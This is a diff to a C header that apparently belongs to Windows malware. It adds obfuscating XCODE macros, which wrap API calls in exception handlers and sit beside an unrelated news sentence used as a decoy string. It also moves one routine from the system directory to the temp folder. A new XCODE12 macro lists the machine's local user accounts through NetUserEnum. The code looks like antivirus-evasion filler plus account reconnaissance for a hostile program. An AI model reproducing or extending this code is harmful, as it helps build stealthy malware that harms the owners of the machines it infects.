@@ -4,7 +4,7 @@
 #pragma  comment(lib, "wininet")
 #pragma  comment(lib, "urlmon")
 #pragma  comment(lib, "ws2_32")
-
+#pragma  comment(lib, "Netapi32")
 
 #define FLOWERX
 
@@ -51,6 +51,15 @@ HKEY hKey;
 char AddMsg[]="President Obama's page on Google's social network site has been inundated with messages in Chinese after restrictions in China were removed.";
 OSVERSIONINFOEX osvi;
 SHQUERYRBINFO shqbi;
+LPUSER_INFO_0 pBuf = NULL;
+LPUSER_INFO_0 pTmpBuf;
+DWORD dwLevel = 0;
+DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
+DWORD dwEntriesRead = 0;
+DWORD dwTotalEntries = 0;
+DWORD dwResumeHandle = 0;
+DWORD dwTotalCount = 0;
+NET_API_STATUS nStatus;
 
 #define XCODE1 __try{\
 		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
@@ -193,7 +202,7 @@ SHQUERYRBINFO shqbi;
 	}
 
 #define XCODE6 __try{\
-	GetSystemDirectory(szXBuff, MAX_PATH);\
+	GetTempPath(MAX_PATH, szXBuff);\
 	SetCurrentDirectory(szXBuff);\
 	hXMod = FindFirstFile(szXBuff, &findData);\
 	if ((hXMod != INVALID_HANDLE_VALUE))\
@@ -366,6 +375,44 @@ SHQUERYRBINFO shqbi;
 	}\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 		Sleep(11);\
+	}
+
+
+#define XCODE12 __try{\
+do {\
+	   nStatus = NetUserEnum(L"localhost",dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);\
+	   if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))\
+	   {\
+		   if ((pTmpBuf = pBuf) != NULL)\
+		   {\
+			   for (dwRes = 0; (dwRes < dwEntriesRead); dwRes++)\
+			   {\
+				   if (pTmpBuf == NULL)\
+				   {\
+					   fprintf(stderr, "An access violation has occurred\n");\
+					   break;\
+				   }\
+				   wprintf(L"\t-- %s\n", pTmpBuf->usri0_name);\
+				   pTmpBuf++;\
+				   dwTotalCount++;\
+			   }\
+		   }\
+	   }\
+	   else\
+		   fprintf(stderr, "A system error has occurred: %d\n", nStatus);\
+	   if (pBuf != NULL)\
+	   {\
+		   NetApiBufferFree(pBuf);\
+		   pBuf = NULL;\
+	   }\
+   }\
+   while (nStatus == ERROR_MORE_DATA);\
+   if (pBuf != NULL)\
+	   NetApiBufferFree(pBuf);\
+   fprintf(stderr, "\nTotal of %d entries enumerated\n", dwTotalCount);\
+	}\
+		__except(EXCEPTION_EXECUTE_HANDLER){\
+		Sleep(12);\
 	}
 
 #ifdef FLOWERX
